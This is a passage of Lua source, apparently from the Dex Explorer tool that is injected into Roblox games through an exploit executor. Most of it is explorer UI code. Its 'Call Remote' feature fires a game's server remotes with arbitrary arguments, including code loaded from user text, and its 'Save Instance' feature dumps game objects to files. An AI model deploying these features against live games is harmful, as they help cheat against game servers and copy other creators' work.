			function Selection:Set(objects)
				local lupdate = false
				local supdate = false

				if #SelectionList > 0 then
					for i = 1,#SelectionList do
						local object = SelectionList[i]
						local node = NodeLookup[object]
						if node then
							node.Selected = false
							SelectionSet[object] = nil
						end
					end

					SelectionList = {}
					Selection.List = SelectionList
					supdate = true
				end

				for i = 1,#objects do
					local l,s = addObject(objects[i])
					lupdate = l or lupdate
					supdate = s or supdate
				end

				if lupdate then
					rawUpdateList()
					supdate = true
				elseif supdate then
					scrollBar:Update()
				end

				if supdate then
					bindSelectionChanged:Fire()
					updateActions()
				end
			end

			function Selection:Add(object)
				local l,s = addObject(object)
				if l then
					rawUpdateList()
					if Updates then
						bindSelectionChanged:Fire()
						updateActions()
					end
				elseif s then
					scrollBar:Update()
					if Updates then
						bindSelectionChanged:Fire()
						updateActions()
					end
				end
			end

			function Selection:StopUpdates()
				Updates = false
			end

			function Selection:ResumeUpdates()
				Updates = true
				bindSelectionChanged:Fire()
				updateActions()
			end

			function Selection:Remove(object,noupdate)
				if SelectionSet[object] then
					local node = NodeLookup[object]
					if node then
						node.Selected = false
						SelectionSet[object] = nil
						for i = 1,#SelectionList do
							if SelectionList[i] == object then
								table.remove(SelectionList,i)
								break
							end
						end

						if not noupdate then
							scrollBar:Update()
						end
						bindSelectionChanged:Fire()
						updateActions()
					end
				end
			end

			function Selection:Get()
				local list = {}
				for i = 1,#SelectionList do
					list[i] = SelectionList[i]
				end
				return list
			end

			bindSetSelection.OnInvoke = function(...)
				Selection:Set(...)
			end

			bindGetSelection.OnInvoke = function()
				return Selection:Get()
			end
		end

		function CreateCaution(title,msg)
			local newCaution = CautionWindow:Clone()
			newCaution.Title.Text = title
			newCaution.MainWindow.Desc.Text = msg
			newCaution.Parent = explorerPanel.Parent
			newCaution.Visible = true
			newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
				newCaution:Destroy()
			end)
		end

		function CreateTableCaution(title,msg)
			if type(msg) ~= "table" then return CreateCaution(title,tostring(msg)) end
			local newCaution = TableCautionWindow:Clone()
			newCaution.Title.Text = title

			local TableList = newCaution.MainWindow.TableResults
			local TableTemplate = newCaution.MainWindow.TableTemplate

			for i,v in pairs(msg) do
				local newResult = TableTemplate:Clone()
				newResult.Type.Text = type(v)
				newResult.Value.Text = tostring(v)
				newResult.Position = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
				newResult.Parent = TableList
				TableList.CanvasSize = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
				newResult.Visible = true
			end
			newCaution.Parent = explorerPanel.Parent
			newCaution.Visible = true
			newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
				newCaution:Destroy()
			end)
		end

		local function Split(str, delimiter)
			local start = 1
			local t = {}
			while true do
				local pos = string.find (str, delimiter, start, true)
				if not pos then
					break
				end
				table.insert (t, string.sub (str, start, pos - 1))
				start = pos + string.len (delimiter)
			end
			table.insert (t, string.sub (str, start))
			return t
		end

		local function ToValue(value,type)
			if type == "Vector2" then
				local list = Split(value,",")
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return Vector2.new(x,y)
			elseif type == "Vector3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				local z = tonumber(list[3]) or 0
				return Vector3.new(x,y,z)
			elseif type == "Color3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local r = tonumber(list[1]) or 0
				local g = tonumber(list[2]) or 0
				local b = tonumber(list[3]) or 0
				return Color3.new(r/255,g/255, b/255)
			elseif type == "UDim2" then
				local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
				if #list < 4 then return nil end
				local xScale = tonumber(list[1]) or 0
				local xOffset = tonumber(list[2]) or 0
				local yScale = tonumber(list[3]) or 0
				local yOffset = tonumber(list[4]) or 0
				return UDim2.new(xScale, xOffset, yScale, yOffset)
			elseif type == "Number" then
				return tonumber(value)
			elseif type == "String" then
				return value
			elseif type == "NumberRange" then
				local list = Split(value,",")
				if #list == 1 then
					if tonumber(list[1]) == nil then return nil end
					local newVal = tonumber(list[1]) or 0
					return NumberRange.new(newVal)
				end
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return NumberRange.new(x,y)
			elseif type == "Script" then
				local success,err = ypcall(function()
					_G.D_E_X_DONOTUSETHISPLEASE = nil
					loadstring(
						"_G.D_E_X_DONOTUSETHISPLEASE = "..value
					)()
					return _G.D_E_X_DONOTUSETHISPLEASE
				end)
				if err then
					return nil
				end
			else
				return nil
			end
		end

		local function ToPropValue(value,type)
			if type == "Vector2" then
				local list = Split(value,",")
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return Vector2.new(x,y)
			elseif type == "Vector3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				local z = tonumber(list[3]) or 0
				return Vector3.new(x,y,z)
			elseif type == "Color3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local r = tonumber(list[1]) or 0
				local g = tonumber(list[2]) or 0
				local b = tonumber(list[3]) or 0
				return Color3.new(r/255,g/255, b/255)
			elseif type == "UDim2" then
				local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
				if #list < 4 then return nil end
				local xScale = tonumber(list[1]) or 0
				local xOffset = tonumber(list[2]) or 0
				local yScale = tonumber(list[3]) or 0
				local yOffset = tonumber(list[4]) or 0
				return UDim2.new(xScale, xOffset, yScale, yOffset)
			elseif type == "Content" then
				return value
			elseif type == "float" or type == "int" or type == "double" then
				return tonumber(value)
			elseif type == "string" then
				return value
			elseif type == "NumberRange" then
				local list = Split(value,",")
				if #list == 1 then
					if tonumber(list[1]) == nil then return nil end
					local newVal = tonumber(list[1]) or 0
					return NumberRange.new(newVal)
				end
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return NumberRange.new(x,y)
			elseif string.sub(value,1,4) == "Enum" then
				local getEnum = value
				while true do
					local x,y = string.find(getEnum,".")
					if y then
						getEnum = string.sub(getEnum,y+1)
					else
						break
					end
				end
				print(getEnum)
				return getEnum
			else
				return nil
			end
		end

		function PromptRemoteCaller(inst)
			if CurrentRemoteWindow then
				CurrentRemoteWindow:Destroy()
				CurrentRemoteWindow = nil
			end
			CurrentRemoteWindow = RemoteWindow:Clone()
			CurrentRemoteWindow.Parent = explorerPanel.Parent
			CurrentRemoteWindow.Visible = true

			local displayValues = false

			local ArgumentList = CurrentRemoteWindow.MainWindow.Arguments
			local ArgumentTemplate = CurrentRemoteWindow.MainWindow.ArgumentTemplate

			if inst:IsA("RemoteEvent") then
				CurrentRemoteWindow.Title.Text = "Fire Event"
				CurrentRemoteWindow.MainWindow.Ok.Text = "Fire"
				CurrentRemoteWindow.MainWindow.DisplayReturned.Visible = false
				CurrentRemoteWindow.MainWindow.Desc2.Visible = false
			end

			local newArgument = ArgumentTemplate:Clone()
			newArgument.Parent = ArgumentList
			newArgument.Visible = true
			newArgument.Type.MouseButton1Down:connect(function()
				createDDown(newArgument.Type,function(choice)
					newArgument.Type.Text = choice
				end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
			end)

			CurrentRemoteWindow.MainWindow.Ok.MouseButton1Up:connect(function()
				if CurrentRemoteWindow and inst.Parent ~= nil then
					local MyArguments = {}
					for i,v in pairs(ArgumentList:GetChildren()) do
						table.insert(MyArguments,ToValue(v.Value.Text,v.Type.Text))
					end
					if inst:IsA("RemoteFunction") then
						if displayValues then
							spawn(function()
								local myResults = inst:InvokeServer(unpack(MyArguments))
								if myResults then
									CreateTableCaution("Remote Caller",myResults)
								else
									CreateCaution("Remote Caller","This remote did not return anything.")
								end
							end)
						else
							spawn(function()
								inst:InvokeServer(unpack(MyArguments))
							end)
						end
					else
						inst:FireServer(unpack(MyArguments))
					end
					CurrentRemoteWindow:Destroy()
					CurrentRemoteWindow = nil
				end
			end)

			CurrentRemoteWindow.MainWindow.Add.MouseButton1Up:connect(function()
				if CurrentRemoteWindow then
					local newArgument = ArgumentTemplate:Clone()
					newArgument.Position = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
					newArgument.Parent = ArgumentList
					ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
					newArgument.Visible = true
					newArgument.Type.MouseButton1Down:connect(function()
						createDDown(newArgument.Type,function(choice)
							newArgument.Type.Text = choice
						end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
					end)
				end
			end)

			CurrentRemoteWindow.MainWindow.Subtract.MouseButton1Up:connect(function()
				if CurrentRemoteWindow then
					if #ArgumentList:GetChildren() > 1 then
						ArgumentList:GetChildren()[#ArgumentList:GetChildren()]:Destroy()
						ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
					end
				end
			end)

			CurrentRemoteWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
				if CurrentRemoteWindow then
					CurrentRemoteWindow:Destroy()
					CurrentRemoteWindow = nil
				end
			end)

			CurrentRemoteWindow.MainWindow.DisplayReturned.MouseButton1Up:connect(function()
				if displayValues then
					displayValues = false
					CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = false
				else
					displayValues = true
					CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = true
				end
			end)
		end

		function PromptSaveInstance(inst)
			if not SaveInstance and not _G.SaveInstance then CreateCaution("SaveInstance Missing","You do not have the SaveInstance function installed. Please go to RaspberryPi's thread to retrieve it.") return end
			if CurrentSaveInstanceWindow then
				CurrentSaveInstanceWindow:Destroy()
				CurrentSaveInstanceWindow = nil
				if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
					explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
				end
			end
			CurrentSaveInstanceWindow = SaveInstanceWindow:Clone()
			CurrentSaveInstanceWindow.Parent = explorerPanel.Parent
			CurrentSaveInstanceWindow.Visible = true

			local filename = CurrentSaveInstanceWindow.MainWindow.FileName
			local saveObjects = true
			local overwriteCaution = false

			CurrentSaveInstanceWindow.MainWindow.Save.MouseButton1Up:connect(function()
				if readfile and getelysianpath then
					if readfile(getelysianpath()..filename.Text..".rbxmx") then
						if not overwriteCaution then
							overwriteCaution = true
							local newCaution = ConfirmationWindow:Clone()
							newCaution.Name = "SaveInstanceOverwriteCaution"
							newCaution.MainWindow.Desc.Text = "The file, "..filename.Text..".rbxmx, already exists. Overwrite?"
							newCaution.Parent = explorerPanel.Parent
							newCaution.Visible = true
							newCaution.MainWindow.Yes.MouseButton1Up:connect(function()
								ypcall(function()
									SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
								end)
								overwriteCaution = false
								newCaution:Destroy()
								if CurrentSaveInstanceWindow then
									CurrentSaveInstanceWindow:Destroy()
									CurrentSaveInstanceWindow = nil
								end
							end)
							newCaution.MainWindow.No.MouseButton1Up:connect(function()
								overwriteCaution = false
								newCaution:Destroy()
							end)
						end
					else
						ypcall(function()
							SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
						end)
						if CurrentSaveInstanceWindow then
							CurrentSaveInstanceWindow:Destroy()
							CurrentSaveInstanceWindow = nil
							if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
								explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
							end
						end
					end
				else
					ypcall(function()
						if SaveInstance then
							SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
						else
							_G.SaveInstance(inst,filename.Text,not saveObjects)
						end
					end)
					if CurrentSaveInstanceWindow then
						CurrentSaveInstanceWindow:Destroy()
						CurrentSaveInstanceWindow = nil
						if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
							explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
						end
					end
				end
			end)
			CurrentSaveInstanceWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
				if CurrentSaveInstanceWindow then
					CurrentSaveInstanceWindow:Destroy()
					CurrentSaveInstanceWindow = nil
					if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
						explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
					end
				end
			end)
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.MouseButton1Up:connect(function()
				if saveObjects then
					saveObjects = false
					CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = false
				else
					saveObjects = true
					CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = true
				end
			end)
		end

		function DestroyRightClick()
			if currentRightClickMenu then
				currentRightClickMenu:Destroy()
				currentRightClickMenu = nil
			end
			if CurrentInsertObjectWindow and CurrentInsertObjectWindow.Visible then
				CurrentInsertObjectWindow.Visible = false
			end
		end

		function rightClickMenu(sObj)
			local mouse = game.Players.LocalPlayer:GetMouse()

			currentRightClickMenu = CreateRightClickMenu(
				{"Cut","Copy","Paste Into","Duplicate","Delete","Group","Ungroup","Select Children","Teleport To","Insert Part","Insert Object","View Script","Save Instance","Call Function","Call Remote"},
				"",
				false,
				function(option)
					if option == "Cut" then
						if not Option.Modifiable then return end
						clipboard = {}
						local list = Selection.List
						local cut = {}
						for i = 1,#list do
							local obj = list[i]:Clone()
							if obj then
								table.insert(clipboard,obj)
								table.insert(cut,list[i])
							end
						end
						for i = 1,#cut do
							pcall(delete,cut[i])
						end
						updateActions()
					elseif option == "Copy" then
						if not Option.Modifiable then return end
						clipboard = {}
						local list = Selection.List
						for i = 1,#list do
							table.insert(clipboard,list[i]:Clone())
						end
						updateActions()
					elseif option == "Paste Into" then
						if not Option.Modifiable then return end
						local parent = Selection.List[1] or workspace
						for i = 1,#clipboard do
							clipboard[i]:Clone().Parent = parent
						end
					elseif option == "Duplicate" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						for i = 1,#list do
							list[i]:Clone().Parent = Selection.List[1].Parent or workspace
						end
					elseif option == "Delete" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						for i = 1,#list do
							pcall(delete,list[i])
						end
						Selection:Set({})
					elseif option == "Group" then
						if not Option.Modifiable then return end
						local newModel = Instance.new("Model")
						local list = Selection:Get()
						newModel.Parent = Selection.List[1].Parent or workspace
						for i = 1,#list do
							list[i].Parent = newModel
						end
						Selection:Set({})
					elseif option == "Ungroup" then
						if not Option.Modifiable then return end
						local ungrouped = {}
						local list = Selection:Get()
						for i = 1,#list do
							if list[i]:IsA("Model") then
								for i2,v2 in pairs(list[i]:GetChildren()) do
									v2.Parent = list[i].Parent or workspace
									table.insert(ungrouped,v2)
								end		
								pcall(delete,list[i])			
							end
						end
						Selection:Set({})
						if SettingsRemote:Invoke("SelectUngrouped") then
							for i,v in pairs(ungrouped) do
								Selection:Add(v)
							end
						end
					elseif option == "Select Children" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						Selection:Set({})
						Selection:StopUpdates()
						for i = 1,#list do
							for i2,v2 in pairs(list[i]:GetChildren()) do
								Selection:Add(v2)
							end
						end
						Selection:ResumeUpdates()
					elseif option == "Teleport To" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						for i = 1,#list do
							if list[i]:IsA("BasePart") then
								pcall(function()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = list[i].CFrame
								end)
								break
							end
						end
					elseif option == "Insert Part" then
						if not Option.Modifiable then return end
						local insertedParts = {}
						local list = Selection:Get()
						for i = 1,#list do
							pcall(function()
								local newPart = Instance.new("Part")
								newPart.Parent = list[i]
								newPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.Head.Position) + Vector3.new(0,3,0)
								table.insert(insertedParts,newPart)
							end)
						end
					elseif option == "Save Instance" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						if #list == 1 then
							list[1].Archivable = true
							ypcall(function()PromptSaveInstance(list[1]:Clone())end)
						elseif #list > 1 then
							local newModel = Instance.new("Model")
							newModel.Name = "SavedInstances"
							for i = 1,#list do
								ypcall(function()
									list[i].Archivable = true
									list[i]:Clone().Parent = newModel
								end)
							end
							PromptSaveInstance(newModel)
						end
					elseif option == "Call Remote" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						for i = 1,#list do
							if list[i]:IsA("RemoteFunction") or list[i]:IsA("RemoteEvent") then
								PromptRemoteCaller(list[i])
								break
							end
						end
					elseif option == "View Script" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						for i = 1,#list do
							if list[i]:IsA("LocalScript") or list[i]:IsA("ModuleScript") then
								ScriptEditorEvent:Fire(list[i])
							end
						end
					end
				end)
			currentRightClickMenu.Parent = explorerPanel.Parent
			currentRightClickMenu.Position = UDim2.new(0,mouse.X,0,mouse.Y)
			if currentRightClickMenu.AbsolutePosition.X + currentRightClickMenu.AbsoluteSize.X > explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X then
				currentRightClickMenu.Position = UDim2.new(0, explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X - currentRightClickMenu.AbsoluteSize.X, 0, mouse.Y)
			end
		end

		local function cancelReparentDrag()end
		local function cancelSelectDrag()end
		do
			local listEntries = {}
			local nameConnLookup = {}

			local mouseDrag = Create('ImageButton',{
				Name = "MouseDrag";
				Position = UDim2.new(-0.25,0,-0.25,0);
				Size = UDim2.new(1.5,0,1.5,0);
				Transparency = 1;
				AutoButtonColor = false;
				Active = true;
				ZIndex = 10;
			})
			local function dragSelect(last,add,button)
				local connDrag
				local conUp

				conDrag = mouseDrag.MouseMoved:connect(function(x,y)
					local pos = Vector2.new(x,y) - listFrame.AbsolutePosition
					local size = listFrame.AbsoluteSize
					if pos.x < 0 or pos.x > size.x or pos.y < 0 or pos.y > size.y then return end

					local i = math.ceil(pos.y/ENTRY_BOUND) + scrollBar.ScrollIndex
					-- Mouse may have made a large step, so interpolate between the
					-- last index and the current.
					for n = i<last and i or last, i>last and i or last do
						local node = TreeList[n]
						if node then
							if add then
								Selection:Add(node.Object)
							else
								Selection:Remove(node.Object)
							end
						end
					end
					last = i
				end)

				function cancelSelectDrag()
					mouseDrag.Parent = nil
					conDrag:disconnect()
					conUp:disconnect()
					function cancelSelectDrag()end
				end

				conUp = mouseDrag[button]:connect(cancelSelectDrag)

				mouseDrag.Parent = GetScreen(listFrame)
			end

			local function dragReparent(object,dragGhost,clickPos,ghostOffset)
				local connDrag
				local conUp
				local conUp2

				local parentIndex = nil
				local dragged = false

				local parentHighlight = Create('Frame',{
					Transparency = 1;
					Visible = false;
					Create('Frame',{
						BorderSizePixel = 0;
						BackgroundColor3 = Color3.new(0,0,0);
						BackgroundTransparency = 0.1;
						Position = UDim2.new(0,0,0,0);
						Size = UDim2.new(1,0,0,1);
					});
					Create('Frame',{
						BorderSizePixel = 0;
						BackgroundColor3 = Color3.new(0,0,0);
						BackgroundTransparency = 0.1;
						Position = UDim2.new(1,0,0,0);
						Size = UDim2.new(0,1,1,0);
					});
					Create('Frame',{
						BorderSizePixel = 0;
						BackgroundColor3 = Color3.new(0,0,0);
						BackgroundTransparency = 0.1;
						Position = UDim2.new(0,0,1,0);
						Size = UDim2.new(1,0,0,1);
					});
					Create('Frame',{
						BorderSizePixel = 0;
						BackgroundColor3 = Color3.new(0,0,0);
						BackgroundTransparency = 0.1;
						Position = UDim2.new(0,0,0,0);
						Size = UDim2.new(0,1,1,0);
					});
				})
				SetZIndex(parentHighlight,9)

				conDrag = mouseDrag.MouseMoved:connect(function(x,y)
					local dragPos = Vector2.new(x,y)
					if dragged then
						local pos = dragPos - listFrame.AbsolutePosition
						local size = listFrame.AbsoluteSize

						parentIndex = nil
						parentHighlight.Visible = false
						if pos.x >= 0 and pos.x <= size.x and pos.y >= 0 and pos.y <= size.y + ENTRY_SIZE*2 then
							local i = math.ceil(pos.y/ENTRY_BOUND-2)
							local node = TreeList[i + scrollBar.ScrollIndex]
							if node and node.Object ~= object and not object:IsAncestorOf(node.Object) then
								parentIndex = i
								local entry = listEntries[i]
								if entry then
									parentHighlight.Visible = true
									parentHighlight.Position = UDim2.new(0,1,0,entry.AbsolutePosition.y-listFrame.AbsolutePosition.y)
									parentHighlight.Size = UDim2.new(0,size.x-4,0,entry.AbsoluteSize.y)
								end
							end
						end

						dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
					elseif (clickPos-dragPos).magnitude > 8 then
						dragged = true
						SetZIndex(dragGhost,9)
						dragGhost.IndentFrame.Transparency = 0.25
						dragGhost.IndentFrame.EntryText.TextColor3 = GuiColor.TextSelected
						dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
						dragGhost.Parent = GetScreen(listFrame)
						parentHighlight.Parent = listFrame
					end
				end)

				function cancelReparentDrag()
					mouseDrag.Parent = nil
					conDrag:disconnect()
					conUp:disconnect()
					conUp2:disconnect()
					dragGhost:Destroy()
					parentHighlight:Destroy()
					function cancelReparentDrag()end
				end

				local wasSelected = Selection.Selected[object]
				if not wasSelected and Option.Selectable then
					Selection:Set({object})
				end

				conUp = mouseDrag.MouseButton1Up:connect(function()
					cancelReparentDrag()
					if dragged then
						if parentIndex then
							local parentNode = TreeList[parentIndex + scrollBar.ScrollIndex]
							if parentNode then
								parentNode.Expanded = true

								local parentObj = parentNode.Object
								local function parent(a,b)
									a.Parent = b
								end
								if Option.Selectable then
									local list = Selection.List
									for i = 1,#list do
										pcall(parent,list[i],parentObj)
									end
								else
									pcall(parent,object,parentObj)
								end
							end
						end
					else
						-- do selection click
						if wasSelected and Option.Selectable then
							Selection:Set({})
						end
					end
				end)
				conUp2 = mouseDrag.MouseButton2Down:connect(function()
					cancelReparentDrag()
				end)

				mouseDrag.Parent = GetScreen(listFrame)
			end

			local entryTemplate = Create('ImageButton',{
				Name = "Entry";
				Transparency = 1;
				AutoButtonColor = false;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(1,0,0,ENTRY_SIZE);
				Create('Frame',{
					Name = "IndentFrame";
					BackgroundTransparency = 1;
					BackgroundColor3 = GuiColor.Selected;
					BorderColor3 = GuiColor.BorderSelected;
					Position = UDim2.new(0,0,0,0);
					Size = UDim2.new(1,0,1,0);
					Create(Icon('ImageButton',0),{
						Name = "Expand";
						AutoButtonColor = false;
						Position = UDim2.new(0,-GUI_SIZE,0.5,-GUI_SIZE/2);
						Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
					});
					Create(Icon(nil,0),{
						Name = "ExplorerIcon";
						Position = UDim2.new(0,2+ENTRY_PADDING,0.5,-GUI_SIZE/2);
						Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
					});
					Create('TextLabel',{
						Name = "EntryText";
						BackgroundTransparency = 1;
						TextColor3 = GuiColor.Text;
						TextXAlignment = 'Left';
						TextYAlignment = 'Center';
						Font = FONT;
						FontSize = FONT_SIZE;
						Text = "";
						Position = UDim2.new(0,2+ENTRY_SIZE+4,0,0);
						Size = UDim2.new(1,-2,1,0);
					});
				});
			})

			function scrollBar.UpdateCallback(self)
				for i = 1,self.VisibleSpace do
					local node = TreeList[i + self.ScrollIndex]
					if node then
						local entry = listEntries[i]
						if not entry then
							entry = Create(entryTemplate:Clone(),{
								Position = UDim2.new(0,2,0,ENTRY_BOUND*(i-1)+2);
								Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE);
								ZIndex = listFrame.ZIndex;
							})
							listEntries[i] = entry

							local expand = entry.IndentFrame.Expand
							expand.MouseEnter:connect(function()
								local node = TreeList[i + self.ScrollIndex]
								if #node > 0 then
									if node.Expanded then
										Icon(expand,NODE_EXPANDED_OVER)
									else
										Icon(expand,NODE_COLLAPSED_OVER)
									end
								end
							end)
							expand.MouseLeave:connect(function()
								local node = TreeList[i + self.ScrollIndex]
								if #node > 0 then
									if node.Expanded then
										Icon(expand,NODE_EXPANDED)
									else
										Icon(expand,NODE_COLLAPSED)
									end
								end
							end)
							expand.MouseButton1Down:connect(function()
								local node = TreeList[i + self.ScrollIndex]
								if #node > 0 then
									node.Expanded = not node.Expanded
									if node.Object == explorerPanel.Parent and node.Expanded then
										CreateCaution("Warning","Please be careful when editing instances inside here, this is like the System32 of Dex and modifying objects here can break Dex.")
									end
									-- use raw update so the list updates instantly
									rawUpdateList()
								end
							end)

							entry.MouseButton1Down:connect(function(x,y)
								local node = TreeList[i + self.ScrollIndex]
								DestroyRightClick()
								if GetAwaitRemote:Invoke() then
									bindSetAwaiting:Fire(node.Object)
									return
								end

								if not HoldingShift then
									lastSelectedNode = i + self.ScrollIndex
								end

								if HoldingShift and not filteringWorkspace() then
									if lastSelectedNode then
										if i + self.ScrollIndex - lastSelectedNode > 0 then
											Selection:StopUpdates()
											for i2 = 1, i + self.ScrollIndex - lastSelectedNode do
												local newNode = TreeList[lastSelectedNode + i2]
												if newNode then
													Selection:Add(newNode.Object)
												end
											end
											Selection:ResumeUpdates()
										else
											Selection:StopUpdates()
											for i2 = i + self.ScrollIndex - lastSelectedNode, 1 do
												local newNode = TreeList[lastSelectedNode + i2]
												if newNode then
													Selection:Add(newNode.Object)
												end
											end
											Selection:ResumeUpdates()
										end
									end
									return
								end

								if HoldingCtrl then
									if Selection.Selected[node.Object] then
										Selection:Remove(node.Object)
									else
										Selection:Add(node.Object)
									end
									return
								end
								if Option.Modifiable then
									local pos = Vector2.new(x,y)
									dragReparent(node.Object,entry:Clone(),pos,entry.AbsolutePosition-pos)
								elseif Option.Selectable then
									if Selection.Selected[node.Object] then
										Selection:Set({})
									else
										Selection:Set({node.Object})
									end
									dragSelect(i+self.ScrollIndex,true,'MouseButton1Up')
								end
							end)

							entry.MouseButton2Down:connect(function()
								if not Option.Selectable then return end

								DestroyRightClick()

								curSelect = entry

								local node = TreeList[i + self.ScrollIndex]

								if GetAwaitRemote:Invoke() then
									bindSetAwaiting:Fire(node.Object)
									return
								end

								if not Selection.Selected[node.Object] then
									Selection:Set({node.Object})
								end
							end)


							entry.MouseButton2Up:connect(function()
								if not Option.Selectable then return end

								local node = TreeList[i + self.ScrollIndex]

								if checkMouseInGui(curSelect) then
									rightClickMenu(node.Object)
								end
							end)

							entry.Parent = listFrame
						end

						entry.Visible = true

						local object = node.Object

						-- update expand icon
						if #node == 0 then
							entry.IndentFrame.Expand.Visible = false
						elseif node.Expanded then
							Icon(entry.IndentFrame.Expand,NODE_EXPANDED)
							entry.IndentFrame.Expand.Visible = true
						else
							Icon(entry.IndentFrame.Expand,NODE_COLLAPSED)
							entry.IndentFrame.Expand.Visible = true
						end

						-- update explorer icon
						Icon(entry.IndentFrame.ExplorerIcon,ExplorerIndex[object.ClassName] or 0)

						-- update indentation
						local w = (node.Depth)*(2+ENTRY_PADDING+GUI_SIZE)
						entry.IndentFrame.Position = UDim2.new(0,w,0,0)
						entry.IndentFrame.Size = UDim2.new(1,-w,1,0)

						-- update name change detection
						if nameConnLookup[entry] then
							nameConnLookup[entry]:disconnect()
						end
						local text = entry.IndentFrame.EntryText
						text.Text = object.Name
						nameConnLookup[entry] = node.Object.Changed:connect(function(p)
							if p == 'Name' then
								text.Text = object.Name
							end
						end)

						-- update selection
						entry.IndentFrame.Transparency = node.Selected and 0 or 1
						text.TextColor3 = GuiColor[node.Selected and 'TextSelected' or 'Text']

						entry.Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE)
					elseif listEntries[i] then
						listEntries[i].Visible = false
					end
				end
				for i = self.VisibleSpace+1,self.TotalSpace do
					local entry = listEntries[i]
					if entry then
						listEntries[i] = nil
						entry:Destroy()
					end
				end
			end

			function scrollBarH.UpdateCallback(self)
				for i = 1,scrollBar.VisibleSpace do
					local node = TreeList[i + scrollBar.ScrollIndex]
					if node then
						local entry = listEntries[i]
						if entry then
							entry.Position = UDim2.new(0,2 - scrollBarH.ScrollIndex,0,ENTRY_BOUND*(i-1)+2)
						end
					end
				end
			end

			Connect(listFrame.Changed,function(p)
				if p == 'AbsoluteSize' then
					rawUpdateSize()
				end
			end)

			local wheelAmount = 6
			explorerPanel.MouseWheelForward:connect(function()
				if scrollBar.VisibleSpace - 1 > wheelAmount then
					scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
				else
					scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
				end
			end)
			explorerPanel.MouseWheelBackward:connect(function()
				if scrollBar.VisibleSpace - 1 > wheelAmount then
					scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
				else
					scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
				end
			end)
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- Object detection

		-- Inserts `v` into `t` at `i`. Also sets `Index` field in `v`.
		local function insert(t,i,v)
			for n = #t,i,-1 do
				local v = t[n]
				v.Index = n+1
				t[n+1] = v
			end
			v.Index = i
			t[i] = v
		end

		-- Removes `i` from `t`. Also sets `Index` field in removed value.
		local function remove(t,i)
			local v = t[i]
			for n = i+1,#t do
				local v = t[n]
				v.Index = n-1
				t[n-1] = v
			end
			t[#t] = nil
			v.Index = 0
			return v
		end

		-- Returns how deep `o` is in the tree.
		local function depth(o)
			local d = -1
			while o do
				o = o.Parent
				d = d + 1
			end
			return d
		end


		local connLookup = {}

		-- Returns whether a node would be present in the tree list
		local function nodeIsVisible(node)
			local visible = true
			node = node.Parent
			while node and visible do
				visible = visible and node.Expanded
				node = node.Parent
			end
			return visible
		end

		-- Removes an object's tree node. Called when the object stops existing in the
		-- game tree.
		local function removeObject(object)
			local objectNode = NodeLookup[object]
			if not objectNode then
				return
			end
